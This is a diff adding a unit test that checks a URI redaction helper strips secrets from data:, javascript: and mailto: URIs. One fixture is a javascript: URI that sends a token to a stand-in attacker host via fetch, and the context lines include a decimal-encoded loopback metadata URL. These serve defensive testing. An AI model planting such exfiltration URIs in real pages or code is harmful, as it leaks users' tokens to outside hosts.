@@ -1863,6 +1863,32 @@ describe("CR-004 provenance redaction helpers", () => {
     expect(redacted.uri_sha256).toMatch(/^[0-9a-f]{64}$/);
   });
 
+  it("never emits payloads from opaque unsupported URIs", () => {
+    for (const { raw, secret } of [
+      {
+        raw: "data:image/svg+xml,<svg data-secret='opaque-token'></svg>",
+        secret: "opaque-token",
+      },
+      {
+        raw: "javascript:fetch('https://attacker.test/?token=script-secret')",
+        secret: "script-secret",
+      },
+      {
+        raw: "mailto:operator@example.test?subject=mail-secret",
+        secret: "mail-secret",
+      },
+    ]) {
+      const redacted = redactUri(raw);
+      expect(redacted.safe_uri).toMatch(
+        /^[a-z]+:\[redacted:[0-9a-f]{12}\]$/,
+      );
+      expect(redacted.safe_uri).not.toContain(secret);
+      expect(redacted.safe_uri).not.toContain("<svg");
+      expect(redacted.safe_uri).not.toContain("fetch");
+      expect(redacted.uri_sha256).toMatch(/^[0-9a-f]{64}$/);
+    }
+  });
+
   it("hashes ambiguous numeric IPv4 authorities before WHATWG-normalized provenance", () => {
     for (const raw of [
       "http://2130706433/metadata.json",
